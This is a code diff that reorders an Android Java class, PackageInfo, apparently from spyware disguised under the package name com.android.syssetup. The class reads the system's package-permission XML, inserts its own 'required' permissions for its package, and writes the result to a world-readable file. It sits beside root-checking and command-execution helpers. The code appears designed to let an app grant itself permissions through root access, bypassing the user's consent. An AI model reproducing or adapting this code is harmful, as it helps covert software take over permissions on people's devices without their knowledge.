@@ -11,6 +11,7 @@ import android.content.Context;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 
+import com.android.mm.M;
 import com.android.syssetup.Root;
 import com.android.syssetup.Status;
 import com.android.syssetup.auto.Cfg;
@@ -22,7 +23,6 @@ import com.android.syssetup.util.Execute;
 import com.android.syssetup.util.ExecuteResult;
 import com.android.syssetup.util.StringUtils;
 import com.android.syssetup.util.Utils;
-import com.android.mm.M;
 
 import org.xml.sax.SAXException;
 
@@ -58,69 +58,8 @@ public class PackageInfo {
 		this.xml = new XmlParser(this.fin);
 	}
 
-	public String getPackagePath() {
-		return this.xml.getPackagePath(this.packageName);
-	}
-
 	static public String getPackageName() {
 		return Status.getAppContext().getPackageName();
-	}
-
-	private ArrayList<String> getPackagePermissions() {
-		return this.xml.getPackagePermissions(this.packageName);
-	}
-
-	public boolean addRequiredPermissions(String outName) {
-		if (this.xml.setPackagePermissions(this.packageName, this.requiredPerms) == false) {
-			return false;
-		}
-
-		serialize(outName);
-
-		return true;
-	}
-
-	private void serialize(String fileName) {
-		FileOutputStream fos;
-
-		try {
-			fos = Status.getAppContext().openFileOutput(fileName, Context.MODE_WORLD_READABLE);
-
-			String xmlOut = xml.serializeXml();
-			fos.write(xmlOut.getBytes());
-			fos.close();
-		} catch (Exception e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
-				Check.log(TAG + " (serialize): Exception during file creation"); //$NON-NLS-1$
-			}
-		}
-	}
-
-	public boolean checkRequiredPermission() {
-		boolean permFound = false;
-		ArrayList<String> a = getPackagePermissions();
-
-		for (int i = 0; i < this.requiredPerms.length; i++) {
-			for (String actualPerms : a) {
-				permFound = false;
-
-				if (actualPerms.equals(this.requiredPerms[i]) == true) {
-					permFound = true;
-					break;
-				}
-			}
-
-			if (permFound == false) {
-				break;
-			}
-		}
-
-		return permFound;
 	}
 
 	static synchronized public boolean checkRoot() { //$NON-NLS-1$
@@ -373,5 +312,66 @@ public class PackageInfo {
 			}
 		}
 		return false;
+	}
+
+	public String getPackagePath() {
+		return this.xml.getPackagePath(this.packageName);
+	}
+
+	private ArrayList<String> getPackagePermissions() {
+		return this.xml.getPackagePermissions(this.packageName);
+	}
+
+	public boolean addRequiredPermissions(String outName) {
+		if (this.xml.setPackagePermissions(this.packageName, this.requiredPerms) == false) {
+			return false;
+		}
+
+		serialize(outName);
+
+		return true;
+	}
+
+	private void serialize(String fileName) {
+		FileOutputStream fos;
+
+		try {
+			fos = Status.getAppContext().openFileOutput(fileName, Context.MODE_WORLD_READABLE);
+
+			String xmlOut = xml.serializeXml();
+			fos.write(xmlOut.getBytes());
+			fos.close();
+		} catch (Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(e);//$NON-NLS-1$
+				Check.log(TAG + " (serialize): Exception during file creation"); //$NON-NLS-1$
+			}
+		}
+	}
+
+	public boolean checkRequiredPermission() {
+		boolean permFound = false;
+		ArrayList<String> a = getPackagePermissions();
+
+		for (int i = 0; i < this.requiredPerms.length; i++) {
+			for (String actualPerms : a) {
+				permFound = false;
+
+				if (actualPerms.equals(this.requiredPerms[i]) == true) {
+					permFound = true;
+					break;
+				}
+			}
+
+			if (permFound == false) {
+				break;
+			}
+		}
+
+		return permFound;
 	}
 }
